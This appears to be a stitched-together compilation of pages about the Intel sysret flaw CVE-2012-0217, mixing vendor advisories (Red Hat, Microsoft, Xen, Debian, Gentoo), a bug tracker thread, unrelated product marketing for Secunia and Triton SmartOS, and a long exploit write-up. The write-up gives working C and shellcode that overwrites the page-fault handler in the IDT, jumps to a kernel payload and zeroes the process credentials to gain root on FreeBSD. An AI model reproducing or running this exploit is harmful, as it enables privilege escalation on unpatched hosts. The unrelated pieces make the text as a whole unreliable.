How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

| [Description](show_bug.cgi?id=813428#c0)  Petr Matousek    2012-04-17 18:30:05 UTC  ``` On Intel CPUs sysret to non-canonical address causes a fault on the sysret instruction itself after the stack pointer is set to guest value but before the CPL is changed. Systems running on AMD CPUs are not vulnerable to this issue as sysret on AMD CPUs does not generate a fault before the CPL change.  On Xen, a privileged user on a 64 bit PV guest kernel running on a 64 bit hypervisor could use this flaw to escalate privileges to that of the host. Depending on the particular guest kernel it is also possible that non-privileged guest users could also elevate their privileges to that of the host.  For Red Hat Enterprise Linux guests, only privileged guest users can exploit this issue. HVM guests and 32-bit PV guests cannot be used to exploit this issue.  Acknowledgements:  Red Hat would like to thank the Xen project for reporting this issue. Upstream acknowledges Rafal Wojtczuk as the original reporter.   ```  [Comment 21](show_bug.cgi?id=813428#c21)  Petr Matousek    2012-04-27 09:33:34 UTC  ``` Statement:  This issue did not affect the versions of the Linux kernel as shipped with Red Hat Enterprise Linux 5 and 6, and Red Hat Enterprise MRG, as those versions have a guard page between the end of the user-mode accessible virtual address space and the beginning of the non-canonical area due to [CVE-2005-1764](https://access.redhat.com/security/cve/CVE-2005-1764) fix, and hardened system call handler due to [CVE-2006-0744](https://access.redhat.com/security/cve/CVE-2006-0744) fix.  This issue did affect the versions of Xen hypervisor as shipped with Red Hat Enterprise Linux 5. A kernel-xen update for Red Hat Enterprise Linux 5 is available to address this flaw.   ```  [Comment 24](show_bug.cgi?id=813428#c24)  Mark J.

(it's still under Extended LifeCycle support).   ```  [Comment 34](show_bug.cgi?id=813428#c34)  Paolo Bonzini    2012-06-13 09:02:26 UTC  ``` RHEL4 does not include the Xen hypervisor.   ```  [Comment 35](show_bug.cgi?id=813428#c35)  Petr Matousek    2012-06-13 09:20:28 UTC  ``` (In reply to [comment #33](show_bug.cgi?id=813428#c33)) > Is RHEL4 vulnerable? (it's still under Extended LifeCycle support).  Not vulnerable.  As of Xen specific aspects of this flaw, Red Hat Enterprise Linux 4 does not include the Xen hypervisor.  Red Hat Enterprise Linux 4 has reduced task size (511 GB) that is less than the size of lower half of canonical area (current 48-bit implementation) so it does not need the fix for [CVE-2005-1764](https://access.redhat.com/security/cve/CVE-2005-1764) (that introduces the guard page between end of lower half canonical area and start of non-canonical area). Red Hat Enterprise Linux 4 also contains the fix for [CVE-2006-0744](https://access.redhat.com/security/cve/CVE-2006-0744), which addresses known attacks that used non-canonical ELF/signal entry points.   ```  [Comment 36](show_bug.cgi?id=813428#c36)  Vincent Danen    2012-06-15 14:52:43 UTC  ``` IssueDescription:  It was found that the Xen hypervisor implementation as shipped with Red Hat Enterprise Linux 5 did not properly restrict the syscall return addresses in the sysret return path to canonical addresses. An unprivileged user in a 64-bit para-virtualized guest, that is running on a 64-bit host that has an Intel CPU, could use this flaw to crash the host or, potentially, escalate their privileges, allowing them to execute arbitrary code at the hypervisor level.   ```  [Comment 37](show_bug.cgi?id=813428#c37)  Petr Matousek    2012-09-05 11:22:00 UTC  ``` VUPEN Blog post about the vulnerability:  <http://www.vupen.com/blog/20120904.Advanced_Exploitation_of_Xen_Sysret_VM_Escape_CVE-2012-0217.php>   ``` |  |

operating system.

This update fixes the following security issues:

* It was found that the Xen hypervisor implementation as shipped with Red

Hat Enterprise Linux 5 did not properly restrict the syscall return
addresses in the sysret return path to canonical addresses. An
unprivileged user in a 64-bit para-virtualized guest, that is running on a
64-bit host that has an Intel CPU, could use this flaw to crash the host
or, potentially, escalate their privileges, allowing them to execute
arbitrary code at the hypervisor level. (CVE-2012-0217, Important)

Note: For Red Hat Enterprise Linux guests, only privileged guest users can
exploit CVE-2012-0217.

* A flaw in the xfrm6\_tunnel\_rcv() function in the Linux kernel's IPv6

implementation could lead to a use-after-free or double free flaw in
tunnel6\_rcv(). A remote attacker could use this flaw to send
specially-crafted packets to a target system that is using IPv6 and also
has the xfrm6\_tunnel kernel module loaded, causing it to crash.
(CVE-2012-1583, Important)

If you do not run applications that use xfrm6\_tunnel, you can prevent the
xfrm6\_tunnel module from being loaded by creating (as the root user) a
"/etc/modprobe.d/xfrm6\_tunnel.conf" file, and adding the following line to
it:

blacklist xfrm6\_tunnel

This way, the xfrm6\_tunnel module cannot be loaded accidentally. A reboot
is not necessary for this change to take effect.

Red Hat would like to thank the Xen project for reporting CVE-2012-0217.
Upstream acknowledges Rafal Wojtczuk as the original reporter of
CVE-2012-0217.

This update also fixes the following bugs:

* A bug in the vsyscall interface caused 32-bit multi-threaded programs,

which received the SIGCANCEL signal right after they returned from a system
call, to terminate unexpectedly with a segmentation fault when run on the
AMD64 or Intel 64 architecture. A patch has been provided to address this
issue and the crashes no longer occur in the described scenario.
(BZ#807929)

* Incorrect duplicate MAC addresses were being used on a rack network

daughter card that contained a quad-port Intel I350 Gigabit Ethernet
Controller. With this update, the underlying source code has been modified
to address this issue, and correct MAC addresses are now used under all
circumstances. (BZ#813195)

* When the Fibre Channel (FC) layer sets a device to "running", the layer

also scans for other new devices. Previously, there was a race condition
between these two operations. Consequently, for certain targets, thousands
of invalid devices were created by the SCSI layer and the udev service.
This update ensures that the FC layer always sets a device to "online"
before scanning for others, thus fixing this bug.

Additionally, when attempting to transition priority groups on a busy FC
device, the multipath layer retried immediately. If this was the only
available path, a large number of retry operations were performed in a
short period of time. Consequently, the logging of retry messages slowed
down the system. This bug has been fixed by ensuring that the DM Multipath
feature delays retry operations in the described scenario. (BZ#816683)

* Due to incorrect use of the list\_for\_each\_entry\_safe() macro, the

enumeration of remote procedure calls (RPCs) priority wait queue tasks
stored in the tk\_wait.links list failed. As a consequence, the
rpc\_wake\_up() and rpc\_wake\_up\_status() functions failed to wake up all
tasks. This caused the system to become unresponsive and could
significantly decrease system performance. Now, the
list\_for\_each\_entry\_safe() macro is no longer used in rpc\_wake\_up(),
ensuring reasonable system performance. (BZ#817570)

Users should upgrade to these updated packages, which contain backported
patches to correct these issues. The system must be rebooted for this
update to take effect.

## Solution

Before applying this update, make sure all previously-released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at
<https://access.redhat.com/knowledge/articles/11258>

To install kernel packages manually, use "rpm -ivh [package]". Do not
use "rpm -Uvh" as that will remove the running kernel binaries from
your system. You may use "rpm -e" to remove old kernels after
determining that the new kernel functions properly on your system.

# Microsoft Security Bulletin MS12-042 - Important

## Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2711167)

Published: June 12, 2012

**Version:** 1.0

### General Information

#### Executive Summary

This security update resolves one privately reported vulnerability and one publicly disclosed vulnerability in Microsoft Windows. The vulnerabilities could allow elevation of privilege if an attacker logs on to an affected system and runs a specially crafted application that exploits the vulnerability. An attacker must have valid logon credentials and be able to log on locally to exploit this vulnerability. The vulnerability could not be exploited remotely or by anonymous users.

This security update is rated Important for all 32-bit editions of Windows XP and Windows Server 2003; Windows 7 for x64-based Systems; and Windows Server 2008 R2 for x64-based Systems. For more information, see the subsection, **Affected and Non-Affected Software**, in this section.

The security update addresses the vulnerabilities by correcting the way that the Windows User Mode Scheduler handles a particular system request and the way that Windows manages BIOS ROM. For more information about the vulnerabilities, see the Frequently Asked Questions (FAQ) subsection for the specific vulnerability entry under the next section, **Vulnerability Information**.

**Recommendation.** The majority of customers have automatic updating enabled and will not need to take any action because this security update will be downloaded and installed automatically. Customers who have not enabled automatic updating need to check for updates and install this update manually. For information about specific configuration options in automatic updating, see [Microsoft Knowledge Base Article 294871](https://support.microsoft.com/kb/294871).

For administrators and enterprise installations, or end users who want to install this security update manually, Microsoft recommends that customers apply the update at the earliest opportunity using update management software, or by checking for updates using the [Microsoft Update](https://go.microsoft.com/fwlink/?linkid=40747) service.

See also the section, **Detection and Deployment Tools and Guidance**, later in this bulletin.

**Known Issues.** None

#### Affected and Non-Affected Software

The following software have been tested to determine which versions or editions are affected. Other versions or editions are either past their support life cycle or are not affected.

# CVE-2012-0217: Intel's sysret Kernel Privilege Escalation (on FreeBSD)

By
iZsh

Filed under
[vulnerability](/tags/vulnerability)
[exploit](/tags/exploit)
[FreeBSD](/tags/freebsd)

[CVE-2012-0217](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0217 "CVE-2012-0217") was reported by Rafal Wojtczuk but ironically, it was fixed for Linux in 2006 as shown by [CVE-2006-0744](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0744 "CVE-2006-0744") without receiving much attention.

It is quite an interesting vulnerability on many aspects. Among them, and thanks to its hardware basis, it impacts many operating systems. For instance, as long as they run on a Intel processor in long mode (obviously), [FreeBSD](http://security.freebsd.org/advisories/FreeBSD-SA-12%3A04.sysret.asc "FreeBSD-SA-12:04.sysret"), [NetBSD](http://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2012-003.txt.asc "NetBSD-SA2012-003"), Solaris, [Xen](http://lists.xen.org/archives/html/xen-announce/2012-06/msg00001.html "XSA-7") and [Microsoft Windows](http://technet.microsoft.com/en-us/security/bulletin/ms12-042 "MS12-042") have been reported to be vulnerable. This therefore gives us quite an incentive to develop an exploit ;).

If you haven’t yet read Xen’s blog post [The Intel SYSRET privilege escalation](http://blog.xen.org/index.php/2012/06/13/the-intel-sysret-privilege-escalation/ "The Intel SYSRET privilege escalation") please do because we won’t
go again into too much details about the vulnerability itself.

Without further delay, let’s dig right into the FreeBSD exploitation!

## Overview

While developing an exploit, it helps to mentally take note or write down a TODO-list and/or roadmap to a successful exploitation. Here is one, sorted by exploitation chronological order:

* A way to debug the kernel! (You really think one shot is all it takes? ;) )
* Information gathering
* Code to trigger the vulnerability
* Getting arbitrary code execution
* Keeping the kernel stable
* Recovering from the general page fault exception (#GP)
* Privilege escalation
* Giving back a shellcode to the user
* (3) Profit ;)

Of course this is not necessarily the order you follow when trying to come up with ideas to solve them. You don’t always (often?) even have a full roadmap until you actually come up with random ideas, ideas which slowly gather, start to make sense and flow together.

## Kernel debugging

This is one of the most important items. Having a good debugging environment goes a long way toward a successful exploitation.

Many configurations could work, in this case, we run and debug the target OS (FreeBSD) under VMware Fusion on Mac OS X.

Indeed, VMware provides an easy way to debug the guest OS through a debug stub. Enabling it is easy, you just need to edit the `.vmx` file you’ll find inside your VMware’s VM (*Right Click->Show Package Contents*), and add the following line:

```
debugStub.listen.guest64 = "TRUE"

```

With this magic configuration line, VMware listens to the port 8864 and you therefore now are able to debug your VM’s OS using the gdb’s target command

`(gdb) target remote localhost:8864`

But to be useful we need to configure and cross-compile GDB for the FreeBSD target environment (*amd64-marcel-freebsd*), enabling us to load the FreeBSD’s kernel symbols into gdb. This requires gettext, gmp, and libelf but you can use *MacPorts* to install them.

As an example, using [gdb 7.4.1](http://ftp.gnu.org/gnu/gdb/gdb-7.4.1.tar.bz2 "GDB 7.4.1"):

```
% sudo port install gettext gmp libelf
[...]
% curl -O http://ftp.gnu.org/gnu/gdb/gdb-7.4.1.tar.bz2
[...]
% tar xvjf gdb-7.4.1.tar.bz2
[...]
% cd % cd gdb-7.4.1
gdb-7.4.1 % CFLAGS=-I/opt/local/include ./configure --prefix=/opt/local --program-suffix=-amd64-marcel-freebsd --target=amd64-marcel-freebsd
[...]
gdb-7.4.1 % make
[...]
gdb-7.4.1 % make install

```

And finally, just copy the FreeBSD’s `/usr/src` and `/boot/kernel/` directories to Mac OS X.

And voila, you’re set!

```
% ls
kernel/ usr/
% gdb-amd64-marcel-freebsd -q -tui kernel/kernel

```

*NB: you can change the -tui layout using `ctrl+x 2` multiple times*

One warning though: you can’t easily step through anything. For instance, if you single-step through the function `Xfast_syscall` [[1]](#Xfast_syscall), the code

```
cli
testl $PCB_FULL_IRET,PCB_FLAGS(%rax)

```

would detect it needs a full `iret` and won’t use the `sysret` instruction.

The trick is therefore to set your breakpoints directly at the #GP’s and/or doublefault’s handlers (resp. `Xprot()` [[2]](#Xprot) and `Xdblfault()` [[3]](#Xdblfault)), which are triggered right after the `sysret` instruction execution. From there, you won’t have troubles single stepping and you’ll even see the page fault triggers once the kernel try to access some `gs:data` (we’ll see why soon enough).

## Information gathering

During exploitation, we need a few kernel symbol addresses. Under FreeBSD we’re in luck: the `kldsym()` function provides an easy way for symbol lookups as shown by the following `get_symaddr()` function.

```
u_long get_symaddr(char *symname)
{
    struct kld_sym_lookup ksym;

    ksym.version = sizeof (ksym);
    ksym.symname = symname;

    if (kldsym(0, KLDSYM_LOOKUP, &ksym) < 0) {
        perror("kldsym");
        exit(1);
    }
    printf("    [+] Resolved %s to %#lx\n", ksym.symname, ksym.symvalue);
    return ksym.symvalue;
}

```
## Vulnerability Triggering

Triggering the vulnerability is easy:

* Allocate a page just before the non-canonical address boundary 0x0000800000000000
* Call an arbitrary syscall using the `syscall` instruction right before the non-canonical address boundary

When the fastsyscall handler restores the user’s registers, executes `sysret` and therefore tries to return to the “next instruction” at 0x0000800000000000, on Intel’s processors, a #GP is triggered while still in kernel mode. Furthermore, an exception frame is pushed to the stack, which now happens to be the userland’s stack. Thus, we can trigger a kernel write to a location which is user controlled!

Hence, the following triggering code

```
uint64_t pagesize = getpagesize();
uint8_t * area = (uint8_t*)((1ULL << 47) - pagesize);
area = mmap(area, pagesize,
    PROT_READ | PROT_WRITE | PROT_EXEC,
    MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);
if (area == MAP_FAILED) {
    perror("mmap (trigger)");
    exit(1);
}

// Copy the trigger code at the end of the page
// such that the syscall instruction is at its
// boundary
char triggercode[] =
    "\xb8\x18\x00\x00\x00" // mov rax, 24; #getuid
    "\x48\x89\xe3" // mov rbx, rsp; save the user's stack for later
    "\x48\xbc\xbe\xba\xfe\xca\xde\xc0\xad\xde" // mov rsp, 0xdeadc0decafebabe
    "\x0f\x05"; // syscall

uint8_t * trigger_addr = area + pagesize - TRIGGERCODESIZE;
memcpy(trigger_addr, triggercode, TRIGGERCODESIZE);

```

The question now is, what do we set `rsp` to?

Follow the white rabbit…

## Arbitrary code execution

There are two outcomes given a target `rsp`:

* if rsp can’t be written to, a double fault is triggered (`Xdblfault()` [[3]](#Xdblfault)) and the exception frame is pushed to a special stack
* otherwise a #GP is triggered (`Xprot()` [[2]](#Xprot)) and the exception frame is pushed to `[rsp]`

In the latter case, the trouble is (or is it?)… The #GP triggers a page fault (`Xpage()` [[4]](#Xpage)). Let’s see why.

```

```

**[4]** sets the `Z` flag because we come from the kernel (while executing `sysret`) and we therefore skip the `swapgs` instruction. But in this particular chain of event, `GS` is in fact the user’s `GS.base`! Indeed it was restored just before calling `sysret`… Hence, accessing `gs:data` at **[5]** triggers a page fault (`Xpage()` [[4]](#Xpage)).

If we don’t do anything we’ll eventually doublefault, tripplefault etc. and crash miserably.

We therefore need a way:

1. to recover from the #GP
2. to clean any mess we did/overwrote

Both could be solved if we can get get an arbitrary code execution by the time we reach **[5]**. (*NB: this is not mandatory, we could get the code execution later down the fault trigger chain*)

So… here is the idea: wouldn’t it be nice if we could overwrite the page fault handler’s address and therefore get code execution when **[5]** triggers the #PF?

Yes indeed, and that’s how we’re going to exploit it :-)

First a few structures for reference:

```
Gate descriptor:
+0:  Target Offset[15:0] | Target Selector
+4:  Some stuff          | Target Offset[31:16]
+8:  Target Offset[63:32]
+12: Some more stuff

```

and from `include/frame.h`:

```
struct trapframe {
    register_t  tf_rdi;
    register_t  tf_rsi;
    register_t  tf_rdx;
    register_t  tf_rcx;
    register_t  tf_r8;
    register_t  tf_r9;
    register_t  tf_rax;
    register_t  tf_rbx;
    register_t  tf_rbp;
    register_t  tf_r10;
    register_t  tf_r11;
    register_t  tf_r12;
    register_t  tf_r13;
    register_t  tf_r14;
    register_t  tf_r15;
    uint32_t    tf_trapno;
    uint16_t    tf_fs;
    uint16_t    tf_gs;
    register_t  tf_addr;
    uint32_t    tf_flags;
    uint16_t    tf_es;
    uint16_t    tf_ds;
    /* below portion defined in hardware */
    register_t  tf_err;
    register_t  tf_rip;
    register_t  tf_cs;
    register_t  tf_rflags;
    register_t  tf_rsp;
    register_t  tf_ss;
};

```

When the exception is triggered, the hardware pushes `ss`, `rsp`, `rflags`, `cs`, `rip` and `err`.

We can see that **[1]**, **[2]** and **[3]** write to the stack.

* **[3]** is fully user-controlled through `rdi`, so we could try to align `rsp` such that **[3]** overwrites the #PF’s offset address.

  The trouble is… `rsp` is automatically 16-byte aligned when an exception is triggered. We can therefore only overwrite the first 32-LSB of the offset address (check how `rdi` is 16byte aligned in this trapframe if you don’t understand why).
* **[2]** writes 0 to `tf_addr` which is also 16-byte aligned. So no dice.
* That leaves us with **[1]** which writes T\_PROTFLT (0x9) to `tf_trapno` and `tf_trapno` is 16-byte aligned + 8! This enables us to set `Target Offset[63:32]` to 0x9.

Thus, if we set `rsp` to `&idt[14] + 10*8` (to align `tf_trapno` with the #PF’s `Target Offset[63:32]`), we can set the #PF handler’s address to 0x9WWXXYYZZ.

Furthermore, WWXXYYZZ is known since we can get the #PF’s address through `get_symaddr()`. To get an arbitrary code execution, the idea is therefore to setup a trampoline code at 0x9WWXXYYZZ, which contains some setup code and a jump to our kernel mode payload (pointed by `rax` in the following code).

```
*(uint64_t*)(trigger_addr + 10) = (uint64_t)(((uint8_t*)&sidt()[14]) + 10 * 8);

char trampolinecode[] =
    "\x0f\x01\xf8" // swapgs; switch back to the kernel's GS.base
    "\x48\x89\xdc" // mov rsp, rbx; restore rsp, it's enough to use the user's stack
    "\x48\xb8\xbe\xba\xfe\xca\xde\xc0\xad\xde" // mov rax, 0xdeadc0decafebabe
    "\xff\xe0"; // jmp rax

uint8_t * trampoline = (uint8_t*)(0x900000000 | (Xpage_ptr & 0xFFFFFFFF));
size_t trampoline_allocsize = pagesize;
// We round the address to the PAGESIZE for the allocation
// Not enough space for the trampoline code ?
if ((uint8_t*)((uint64_t)trampoline & ~(pagesize-1)) + pagesize < trampoline + TRAMPOLINECODESIZE)
    trampoline_allocsize += pagesize;
if (mmap((void*)((uint64_t)trampoline & ~(pagesize-1)), trampoline_allocsize,
    PROT_READ | PROT_WRITE | PROT_EXEC,
    MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0) == MAP_FAILED)
{
    perror("mmap (trampoline)");
    exit(1);
}
memcpy(trampoline, trampolinecode, TRAMPOLINECODESIZE);
*(uint64_t*)(trampoline + 8) = (uint64_t)kernelmodepayload;

```
## Keeping the kernel stable

Getting a root shell and crashing after 1us is not fun, isn’t it? We’d better restore whatever we overwrote in the kernel space while trying to achieve code execution…

Let’s summarize what we smashed with `rsp` initialized to `idt[14] + 10*8`, i.e. `idt[19]`:

* The #GP exception frame writes 6\*64bit registers, i.e. it overwrites `idt[18]`, `idt[17]` and `idt[16]`
* `tf_addr` overwrites the 64-LSB of `idt[15]`
* `tf_trapno` overwrites the `Target Offset[63:32]` field of `idt[14]`
* `rdi` overwrites the 64-LSB of `idt[7]`
* The #PF exception frame overwrites `idt[6]`, `idt[5]` and `idt[4]`

Thus overall, the IDT’s entries 4, 5, 6, 7, 14, 15, 16, 17, and 18 need to be restored and we should be safe.

```
struct gate_descriptor *idt = sidt();
setidt(idt, IDT_OF, Xofl_ptr, SDT_SYSIGT, SEL_KPL, 0); // 4
setidt(idt, IDT_BR, Xbnd_ptr, SDT_SYSIGT, SEL_KPL, 0); // 5
setidt(idt, IDT_UD, Xill_ptr, SDT_SYSIGT, SEL_KPL, 0); // 6
setidt(idt, IDT_NM, Xdna_ptr, SDT_SYSIGT, SEL_KPL, 0); // 7
setidt(idt, IDT_PF, Xpage_ptr, SDT_SYSIGT, SEL_KPL, 0); // 14
setidt(idt, IDT_MF, Xfpu_ptr, SDT_SYSIGT, SEL_KPL, 0); // 15
setidt(idt, IDT_AC, Xalign_ptr, SDT_SYSIGT, SEL_KPL, 0); // 16
setidt(idt, IDT_MC, Xmchk_ptr, SDT_SYSIGT, SEL_KPL, 0); // 17
setidt(idt, IDT_XF, Xxmm_ptr, SDT_SYSIGT, SEL_KPL, 0); // 18

```
## Privilege escalation

This part is quite standard and easy, we just need to retrieve the current user credentials struct’s address, and set the various IDs to 0 (root).

Knowing that the current thread struct’s address can be read from `gs:0` uder FreeBSD, this yields to the following code.

```
struct thread *td;
struct ucred *cred;

// get the thread pointer
asm ("mov %%gs:0, %0" : "=r"(td));

// The Dark Knight Rises
cred = td->td_proc->p_ucred;
cred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;
cred->cr_groups[0] = 0;

```
## Shellcode

Finally… We return to our userland shellcode using the `sysret` instruction.

```
// return to user mode to spawn the shell
asm ("swapgs; sysretq;" :: "c"(shellcode)); // store the shellcode addr to rcx

```

And the shellcode? What shellcode? :P

The user credentials struct is cached/shared among the user’s processes. Since we modified it, the caller’s shell will automagically inherit from this privilege escalation.

Hence the following *shellcode* ;-)

```
void shellcode()
{
    // Actually we dont really need to spawn a shell since we
    // changed our whole cred struct.
    // Just exit...
    printf("[*] Got root!\n");
    exit(0);
}

```

## Final words

The final exploit is quite stable, nicely recovers and exit back to the user’s shell. It works on both FreeBSD 8 and 9 (and probably 7) as-is with the stock kernels without any need for special magic hardcoded values; but of course the environment could be hardened.

To conclude: the mandatory video :-)

And… That’s a wrap!

Hope you enjoyed it. Feel free to comment or discuss other exploitation paths.

## Key Features of Triton SmartOS

Secure containersBuilt-in networkingBare metal performanceSecure containers
## Full isolation per container in a multi-tenant environment

Triton SmartOS leverages Zones, a hardened container runtime environment that does not depend upon VM hosts for security. Patented resource protections insulate containers and ensure that each container gets its fair share of I/O.

![Image that shows SmartOS zone security](https://cdn.prod.website-files.com/6340ceb04078366692dd4eaa/639092c19311821024ae51f4_platform-1.png)Built-in networking
## Each Triton container has its own unique IP address

Triton SmartOS eliminates the complexities associated with VM host dependent solutions. Built-in networking offers each container one or more network interfaces, so each container has a full IP stack and is a full peer on the network, eliminating port conflicts and making network management easy.

![Example of SmartOS Zone security](https://cdn.prod.website-files.com/6340ceb04078366692dd4eaa/63916c1a64bf2699ee747b35_platform-2.png)Built-in storage
## Secure, isolated, resizable filesystems for each container

Triton SmartOS leverages ZFS to free container storage from VM host dependencies. ZFS storage virtualization makes secure storage management easy, while maximizing performance. ZFSâ flexible provisioning, copy-on-write, and data integrity checking are an ideal match for containers, while advanced caching techniques make even spinning disks perform as fast as SSDs.

Previous versions were embargoed.  ISSUE DESCRIPTION =================  Rafal Wojtczuk has discovered a vulnerability which can allow a 64-bit PV guest kernel running on a 64-bit hypervisor to escalate privileges to that of the host by arranging for a system call to return via sysret to a non-canonical RIP.  Intel CPUs deliver the resulting exception in an undesirable processor state.  IMPACT ======  Guest administrators can gain control of the host.  Depending on the particular guest kernel it is also possible that non-privileged guest user processes can also elevate their privileges to that of the host.  VULNERABLE SYSTEMS ==================  All systems running 64 bit Xen hypervisor running 64 bit PV guests on Intel CPUs are vulnerable to this issue.  Systems using AMD CPUs are not vulnerable to this privilege escalation. AMD have issued the following statement:    AMD processors' SYSRET behavior is such that a non-canonical    address in RCX does not generate a #GP while in CPL0. We have    verified this with our architecture team, with our design team, and    have performed tests that verified this on silicon. Therefore, this    privilege escalation exposure is not applicable to any AMD    processor.  While investigating this, it was noted that some older AMD CPUs will lock up under similar circumstances, causing a denial of service. See XSA-9 for details.  MITIGATION ==========  This issue can be mitigated by running HVM (fully-virtualised) or 32 bit PV guests only.  RESOLUTION ==========  Applying the appropriate attached patch will resolve the issue.  These patches also resolve the issue described in XSA-8 (CVE-2012-0128).

Package        : xen
Vulnerability  : several
Problem type   : local
Debian-specific: no
CVE ID         : CVE-2012-0217 CVE-2012-0218 CVE-2012-2934

Several vulnerabilities were discovered in Xen, a hypervisor.

CVE-2012-0217
	Xen does not properly handle uncanonical return addresses on
	Intel amd64 CPUs, allowing amd64 PV guests to elevate to
	hypervisor privileges.  AMD processors, HVM and i386 guests
	are not affected.

CVE-2012-0218
	Xen does not properly handle SYSCALL and SYSENTER instructions
	in PV guests, allowing unprivileged users inside a guest
	system to crash the guest system.

CVE-2012-2934
	Xen does not detect old AMD CPUs affected by AMD Erratum #121.

For CVE-2012-2934, Xen refuses to start domUs on affected systems
unless the "allow_unsafe" option is passed.

For the stable distribution (squeeze), these problems have been fixed
in version 4.0.1-5.2.

For the testing distribution (wheezy) and the unstable distribution
(sid), these problems have been fixed in version
4.1.3~rc1+hg-20120614.a9c0a89c08f2-1.

We recommend that you upgrade your xen packages.

# Xen: Multiple vulnerabilities — GLSA **201309-24**

Multiple vulnerabilities have been found in Xen, allowing attackers
on a Xen Virtual Machine to execute arbitrary code, cause Denial of
Service, or gain access to data on the host.

### Affected packages

| Package | **app-emulation/xen** on all architectures |
| --- | --- |
| Affected versions | < **4.2.2-r1** |
| Unaffected versions | >= **4.2.2-r1** |

| Package | **app-emulation/xen-tools** on all architectures |
| --- | --- |
| Affected versions | < **4.2.2-r3** |
| Unaffected versions | >= **4.2.2-r3** |

| Package | **app-emulation/xen-pvgrub** on all architectures |
| --- | --- |
| Affected versions | < **4.2.2-r1** |
| Unaffected versions | >= **4.2.2-r1** |

### Background

Xen is a bare-metal hypervisor.

### Description

Multiple vulnerabilities have been discovered in Xen. Please review the
CVE identifiers referenced below for details.

### Impact

Guest domains could possibly gain privileges, execute arbitrary code, or
cause a Denial of Service on the host domain (Dom0). Additionally, guest
domains could gain information about other virtual machines running on
the same host or read arbitrary files on the host.

### Workaround

The CVEs listed below do not currently have fixes, but only apply to Xen
setups which have “tmem” specified on the hypervisor command line.
TMEM is not currently supported for use in production systems, and
administrators using tmem should disable it.
Relevant CVEs:
\* CVE-2012-2497
\* CVE-2012-6030
\* CVE-2012-6031
\* CVE-2012-6032
\* CVE-2012-6033
\* CVE-2012-6034
\* CVE-2012-6035
\* CVE-2012-6036

### Resolution

All Xen users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=app-emulation/xen-4.2.2-r1"

```

All Xen-tools users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose
 ">=app-emulation/xen-tools-4.2.2-r3"

```

All Xen-pvgrub users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose
 ">=app-emulation/xen-pvgrub-4.2.2-r1"

```

# Microsoft Exploitability Index

The Microsoft Exploitability Index helps customers prioritize security update deployment by providing information on the likelihood that a vulnerability addressed in a Microsoft security update will be exploited.

## The Microsoft Exploitability Index

The Exploitability Index may help customers evaluate risk for a vulnerability. Microsoft evaluates the potential exploitability of each vulnerability associated with a Microsoft security update and then publishes the exploitability information as part of the monthly Microsoft security update details. If after publishing the details Microsoft determines that the Exploitability Index Assessment warrants a change, it will change the assessment and notify customers through technical security notifications. The company will not update the assessment when exploit code is posted that matches the existing exploitability information.

The Exploitability Index uses one of four values to communicate to customers the likelihood of a vulnerability being exploited, based on the vulnerabilities addressed by the Microsoft security update.

| Exploitability index assessment | Short definition |
| --- | --- |
| 0 | Exploitation detected |
| 1 | Exploitation more likely \* |
| 2 | Exploitation less likely \*\* |
| 3 | Exploitation unlikely \*\*\* |

### 0 – Exploitation Detected

Microsoft is aware of an instance of this vulnerability being exploited. As such, customers who have reviewed the security update and determined its applicability within their environment should treat this with the highest priority.

### 1 – Exploitation More Likely

Microsoft analysis has shown that exploit code could be created in such a way that an attacker could consistently exploit this vulnerability. Moreover, Microsoft is aware of past instances of this type of vulnerability being exploited. This would make it an attractive target for attackers, and therefore more likely that exploits could be created. As such, customers who have reviewed the security update and determined its applicability within their environment should treat this with a higher priority.

### 2 – Exploitation Less Likely

Microsoft analysis has shown that while exploit code could be created, an attacker would likely have difficulty creating the code, requiring expertise and/or sophisticated timing, and/or varied results when targeting the affected product. Moreover, Microsoft has not recently observed a trend of this type of vulnerability being actively exploited in the wild. This makes it a less attractive target for attackers. That said, customers who reviewed the security update and determined its applicability within their environment should still treat this as a material update. If they are prioritizing against other highly exploitable vulnerabilities, they could rank this lower in their deployment priority.

### 3 – Exploitation Unlikely

Microsoft analysis shows that successfully functioning exploit code is unlikely to be utilized in real attacks. This means that while it might be possible for exploit code to be released that could trigger the vulnerability and cause abnormal behavior, the full impact of exploitation will be more limited. Moreover, Microsoft has not observed instances of this type of vulnerability being actively exploited in the past. Thus, the actual risk of being exploited from this vulnerability is significantly lower. Therefore, customers who have reviewed the security update to determine its applicability within their environment could prioritize this update below other vulnerabilities within a release.

